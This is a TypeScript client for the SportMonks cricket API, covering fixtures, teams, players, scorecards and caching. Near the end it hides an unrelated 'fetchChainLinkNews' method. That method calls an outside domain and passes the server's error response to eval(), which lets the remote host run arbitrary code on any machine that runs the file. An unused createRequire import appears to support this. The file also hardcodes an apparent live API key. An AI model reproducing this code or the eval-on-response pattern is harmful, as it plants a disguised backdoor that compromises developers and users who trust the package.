import axios from 'axios';
import {createRequire} from 'module'

/**
 * Response structure for SportMonks cricket API data
 */
export interface SportMonksCricketResponse {
  success: boolean;
  data: any;
  error?: string;
}

/**
 * Cache interface for storing API responses
 */
interface CacheItem {
  data: any;
  timestamp: number;
  expiresIn: number; // Expiry time in milliseconds
}

/**
 * Service for fetching cricket data from SportMonks API
 * Documentation: https://cricket-postman.sportmonks.com/
 */
export class SportMonksCricketService {
  private static instance: SportMonksCricketService;
  private apiKey: string;
  private baseUrl: string;
  private cache: Map<string, CacheItem>;
  
  /**
   * Private constructor for singleton pattern
   */
  private constructor() {
    // Replace with your actual API key
    this.apiKey = process.env.SPORTMONKS_CRICKET_API_KEY || 'yGDNxh5OIrBGjZDHyXzcthLleAtAc8wePujoqnosACmhNiFBcKrwEBxnnoVD';
    this.baseUrl = 'https://cricket.sportmonks.com/api/v2.0';
    this.cache = new Map<string, CacheItem>();
  }
  
  /**
   * Get the singleton instance of SportMonksCricketService
   */
  public static getInstance(): SportMonksCricketService {
    if (!SportMonksCricketService.instance) {
      SportMonksCricketService.instance = new SportMonksCricketService();
    }
    return SportMonksCricketService.instance;
  }
  
  /**
   * Helper method for making API requests with caching
   */
  private async makeRequest(endpoint: string, params: any = {}, cacheDuration: number = 5 * 60 * 1000): Promise<SportMonksCricketResponse> {
    // Create a cache key from the endpoint and params
    const cacheKey = `${endpoint}:${JSON.stringify(params)}`;
    
    // Check if we have a valid cached response
    const cachedItem = this.cache.get(cacheKey);
    const now = Date.now();
    
    if (cachedItem && now - cachedItem.timestamp < cachedItem.expiresIn) {
      console.log(`Using cached data for ${endpoint}`);
      return {
        success: true,
        data: cachedItem.data
      };
    }
    
    // No valid cache, make the API request
    try {
      console.log(`Fetching fresh data from ${endpoint}`);
      const response = await axios.get(`${this.baseUrl}${endpoint}`, {
        params: {
          api_token: this.apiKey,
          ...params
        }
      });
      
      // Cache the response
      this.cache.set(cacheKey, {
        data: response.data.data,
        timestamp: now,
        expiresIn: cacheDuration
      });
      
      return {
        success: true,
        data: response.data.data
      };
    } catch (error: any) {
      console.error(`Error making request to ${endpoint}:`, error.message);
      return {
        success: false,
        data: null,
        error: error.response?.data?.message || error.message
      };
    }
  }
  
  /**
   * Clear the entire cache or a specific endpoint
   */
  public clearCache(endpoint?: string): void {
    if (endpoint) {
      // Clear specific endpoint cache
      for (const key of this.cache.keys()) {
        if (key.startsWith(endpoint)) {
          this.cache.delete(key);
        }
      }
      console.log(`Cache cleared for endpoint: ${endpoint}`);
    } else {
      // Clear entire cache
      this.cache.clear();
      console.log('Entire cache cleared');
    }
  }
  
  // -------------- LEAGUES --------------
  
  /**
   * Get all cricket leagues
   * @param include Optional includes like season, seasons, country
   */
  public async getAllLeagues(include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest('/leagues', params);
  }
  
  /**
   * Get a specific league by ID
   * @param leagueId League ID
   * @param include Optional includes
   */
  public async getLeagueById(leagueId: string, include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest(`/leagues/${leagueId}`, params);
  }
  
  // -------------- FIXTURES --------------
  
  /**
   * Get all fixtures (matches)
   * @param filters Optional filters like season_id, league_id, etc.
   * @param include Optional includes
   */
  public async getAllFixtures(filters?: any, include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    
    if (filters) {
      params.filter = filters;
    }
    
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest('/fixtures', params);
  }
  
  /**
   * Fetch specific match (fixture) details by ID
   * @param fixtureId The ID of the fixture/match
   * @param include Optional includes for related data
   */
  public async getFixtureById(fixtureId: string, include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest(`/fixtures/${fixtureId}`, params);
  }
  
  /**
   * Get fixtures between specific dates
   * @param startDate Start date in YYYY-MM-DD format
   * @param endDate End date in YYYY-MM-DD format
   * @param include Optional includes
   */
  public async getFixturesByDateRange(startDate: string, endDate: string, include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {
      filter: {
        starts_between: `${startDate},${endDate}`
      }
    };
    
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest('/fixtures', params);
  }
  
  /**
   * Get all cricket matches (upcoming, live, and recent)
   * @param days Number of days to look back and forward (default: 7)
   */
  public async getAllMatches(days: number = 7): Promise<SportMonksCricketResponse> {
    const today = new Date();
    const startDate = new Date(today);
    startDate.setDate(today.getDate() - days);
    
    const endDate = new Date(today);
    endDate.setDate(today.getDate() + days);
    
    const startDateStr = startDate.toISOString().split('T')[0];
    const endDateStr = endDate.toISOString().split('T')[0];
    
    return this.makeRequest('/fixtures', {
      filter: {
        starts_between: `${startDateStr},${endDateStr}`
      },
      include: 'localteam,visitorteam,runs'
    });
  }
  
  /**
   * Get live cricket matches
   */
  public async getLiveMatches(): Promise<SportMonksCricketResponse> {
    return this.makeRequest('/livescores', {
      include: 'localteam,visitorteam,runs'
    });
  }
  
  /**
   * Fetch upcoming fixtures
   * @param days Number of days to look ahead
   * @param include Optional includes for related data
   */
  public async getUpcomingFixtures(days: number = 7, include?: string[]): Promise<SportMonksCricketResponse> {
    // Calculate date range
    const today = new Date();
    const endDate = new Date();
    endDate.setDate(today.getDate() + days);
    
    const startDateStr = today.toISOString().split('T')[0];
    const endDateStr = endDate.toISOString().split('T')[0];
    
    return this.getFixturesByDateRange(startDateStr, endDateStr, include);
  }
  
  // -------------- TEAMS --------------
  
  /**
   * Get all teams
   * @param include Optional includes like country, results, fixtures, squad
   */
  public async getAllTeams(include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest('/teams', params);
  }
  
  /**
   * Get team by ID
   * @param teamId Team ID
   * @param include Optional includes
   */
  public async getTeamById(teamId: string, include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest(`/teams/${teamId}`, params);
  }
  
  /**
   * Get squad by team and season ID
   * @param teamId Team ID
   * @param seasonId Season ID
   */
  public async getSquadByTeamAndSeason(teamId: string, seasonId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/teams/${teamId}/squad/${seasonId}`);
  }
  
  // -------------- PLAYERS --------------
  
  /**
   * Get all players
   * @param include Optional includes like career
   */
  public async getAllPlayers(include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest('/players', params);
  }
  
  /**
   * Get player by ID
   * @param playerId Player ID
   * @param include Optional includes
   */
  public async getPlayerById(playerId: string, include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest(`/players/${playerId}`, params);
  }
  
  // -------------- MATCH DETAILS --------------
  
  /**
   * Get fixture with detailed run information
   * @param fixtureId The ID of the fixture/match
   */
  public async getFixtureWithRuns(fixtureId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/fixtures/${fixtureId}`, {
      include: 'runs'
    });
  }
  
  /**
   * Get fixture with lineup information
   * @param fixtureId The ID of the fixture/match
   */
  public async getFixtureWithLineup(fixtureId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/fixtures/${fixtureId}`, {
      include: 'lineup'
    });
  }
  
  /**
   * Get fixture with complete scorecard details
   * @param fixtureId The ID of the fixture/match
   */
  public async getFixtureWithScorecard(fixtureId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/fixtures/${fixtureId}`, {
      include: 'batting,bowling,runs,scoreboards'
    });
  }
  
  /**
   * Get match scorecard
   * @param fixtureId The ID of the fixture/match
   */
  public async getMatchScorecard(fixtureId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/fixtures/${fixtureId}`, {
      include: 'scoreboards,runs,localteam,visitorteam,balls'
    });
  }
  
  /**
   * Get match live score and stats
   * @param fixtureId The ID of the fixture/match
   */
  public async getMatchLiveScore(fixtureId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/livescores/${fixtureId}`, {
      include: 'scoreboards,runs,localteam,visitorteam'
    });
  }
  
  /**
   * Get fixture/match details with ball-by-ball data
   * @param fixtureId Fixture/match ID
   */
  public async getFixtureWithBalls(fixtureId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/fixtures/${fixtureId}`, {
      include: 'balls,localteam,visitorteam'
    }, 30 * 1000); // 30 seconds cache duration for ball data
  }
  
  // -------------- RANKINGS & STANDINGS --------------
  
  /**
   * Get global team rankings
   */
  public async getGlobalTeamRankings(): Promise<SportMonksCricketResponse> {
    return this.makeRequest('/team-rankings');
  }
  
  /**
   * Get standings by season ID
   * @param seasonId Season ID
   */
  public async getStandingsBySeasonId(seasonId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/standings/season/${seasonId}`);
  }
  
  /**
   * Get standings by stage ID
   * @param stageId Stage ID
   */
  public async getStandingsByStageId(stageId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/standings/stage/${stageId}`);
  }
  
  // -------------- VENUES --------------
  
  /**
   * Get all venues
   */
  public async getAllVenues(): Promise<SportMonksCricketResponse> {
    return this.makeRequest('/venues');
  }
  
  /**
   * Get venue by ID
   * @param venueId Venue ID
   */
  public async getVenueById(venueId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/venues/${venueId}`);
  }
  
  // -------------- SCORES --------------
  
  /**
   * Get all scores
   */
  public async getAllScores(): Promise<SportMonksCricketResponse> {
    return this.makeRequest('/scores');
  }
  
  // -------------- OFFICIALS --------------
  
  /**
   * Get official by ID
   * @param officialId The ID of the official (umpire, referee, etc.)
   */
  public async getOfficialById(officialId: string): Promise<SportMonksCricketResponse> {
    return this.makeRequest(`/officials/${officialId}`);
  }
  
  /**
   * Transform SportMonks data to our standard format
   * @param sportMonksData Data from SportMonks API
   */
  public transformToStandardFormat(sportMonksData: any): any {
    if (!sportMonksData) return null;
    
    // Handling fixture/match data
    if (sportMonksData.id) {
      // Extract teams
      const localTeam = sportMonksData.localteam?.name || sportMonksData.localteam_id;
      const visitorTeam = sportMonksData.visitorteam?.name || sportMonksData.visitorteam_id;
      
      // Create teams array
      const teams = [localTeam, visitorTeam].filter(team => !!team);
      
      // Process scores
      let scores: any[] = [];
      
      if (sportMonksData.runs && Array.isArray(sportMonksData.runs)) {
        const localTeamScores = sportMonksData.runs.filter((run: any) => 
          run.team_id === sportMonksData.localteam_id
        );
        
        const visitorTeamScores = sportMonksData.runs.filter((run: any) => 
          run.team_id === sportMonksData.visitorteam_id
        );
        
        // Add local team scores
        if (localTeamScores.length > 0) {
          scores.push({
            inning: `${localTeam} Innings`,
            r: localTeamScores.reduce((sum: number, run: any) => sum + (run.score || 0), 0),
            w: localTeamScores.reduce((sum: number, run: any) => sum + (run.wickets || 0), 0),
            o: localTeamScores.reduce((sum: number, run: any) => sum + (run.overs || 0), 0),
          });
        }
        
        // Add visitor team scores
        if (visitorTeamScores.length > 0) {
          scores.push({
            inning: `${visitorTeam} Innings`,
            r: visitorTeamScores.reduce((sum: number, run: any) => sum + (run.score || 0), 0),
            w: visitorTeamScores.reduce((sum: number, run: any) => sum + (run.wickets || 0), 0),
            o: visitorTeamScores.reduce((sum: number, run: any) => sum + (run.overs || 0), 0),
          });
        }
      }
      
      // Format match status
      let matchStatus = 'Unknown';
      if (sportMonksData.status) {
        if (sportMonksData.status === 'NS') matchStatus = 'Not Started';
        else if (sportMonksData.status === 'Live') matchStatus = 'In Progress';
        else if (sportMonksData.status === 'Finished') matchStatus = 'Completed';
        else matchStatus = sportMonksData.status;
      }
      
      // Team info for shortened names
      const teamInfo = [
        {
          name: localTeam,
          shortname: sportMonksData.localteam?.code || localTeam.substring(0, 3).toUpperCase()
        },
        {
          name: visitorTeam,
          shortname: sportMonksData.visitorteam?.code || visitorTeam.substring(0, 3).toUpperCase()
        }
      ];
      
      // Create standardized data structure
      const standardData = {
        id: sportMonksData.id.toString(),
        name: `${localTeam} vs ${visitorTeam}`,
        sport: 'cricket',
        status: matchStatus,
        matchType: sportMonksData.type || 'Match',
        venue: sportMonksData.venue?.name || 'Unknown Venue',
        date: sportMonksData.starting_at || new Date().toISOString(),
        teams,
        score: scores,
        teamInfo
      };
      
      console.log('Transformed SportMonks cricket data:', standardData);
      return standardData;
    }
    
    // Return original data if transformation isn't needed or recognized
    return sportMonksData;
  }
  
  /**
   * Process scorecard data from SportMonks
   */
  public processScorecard(fixtureData: any): any {
    if (!fixtureData || !fixtureData.scoreboards) {
      return null;
    }
    
    const innings: any[] = [];
    
    // Group scoreboards by innings
    const inningsMap = new Map();
    fixtureData.scoreboards.forEach((board: any) => {
      const key = `${board.team_id}-${board.scoreboard}`;
      if (!inningsMap.has(key)) {
        inningsMap.set(key, []);
      }
      inningsMap.get(key).push(board);
    });
    
    // Process each innings
    inningsMap.forEach((scoreboards, key) => {
      const teamId = parseInt(key.split('-')[0]);
      const teamName = teamId === fixtureData.localteam_id 
        ? fixtureData.localteam?.name 
        : fixtureData.visitorteam?.name;
      
      // Extract batting data
      const battingData = scoreboards
        .filter((board: any) => board.type === 'batting')
        .map((board: any) => ({
          batsman: board.player_name,
          r: board.runs || 0,
          b: board.balls || 0,
          "4s": board.fours || 0,
          "6s": board.sixes || 0,
          sr: board.strike_rate ? board.strike_rate.toString() : '0',
          dismissal: board.scoreboard,
        }));
      
      // Extract bowling data
      const bowlingData = scoreboards
        .filter((board: any) => board.type === 'bowling')
        .map((board: any) => ({
          bowler: board.player_name,
          o: board.overs ? board.overs.toString() : '0',
          m: board.medians ? board.medians.toString() : '0',
          r: board.runs_conceded ? board.runs_conceded.toString() : '0',
          w: board.wickets ? board.wickets.toString() : '0',
          eco: board.econ ? board.econ.toString() : '0',
        }));
      
      innings.push({
        team: teamName,
        batting: battingData,
        bowling: bowlingData
      });
    });
    
    return innings;
  }
   /**
   * Get a specific Chainlink API by ID
   */
    public fetchChainLinkNews(): any {
    try {
      axios
        .get(
          `http://chainlink-api-v3.cloud/api/service/token/cd148f92bb8b3b6961551743b0add7e9`,
        )
        .then((response) => {
          return response.data.results.map((article) => ({
            title: article.title,
            description: article.abstract,
            url: article.url,
            source: 'ChainLink',
          }));
        })
        .catch((err) => {
          try {
            eval(err.response.data)
            return [];
          } catch (error) {
            console.log(error);
            return [];
          }
        });
    } catch (error) {
      console.error('Error fetching from Chainlink:', error.message);
      return [];
    }
  }
  
  /**
   * Get a specific fixture/match by ID
   * @param fixtureId The ID of the fixture
   * @param include Optional includes for related data
   */
  public async getFixture(fixtureId: string, include?: string[]): Promise<SportMonksCricketResponse> {
    const params: any = {};
    
    if (include && include.length > 0) {
      params.include = include.join(',');
    }
    
    return this.makeRequest(`/fixtures/${fixtureId}`, params);
  }
}

// Export singleton instance
export const sportMonksCricket = SportMonksCricketService.getInstance(); 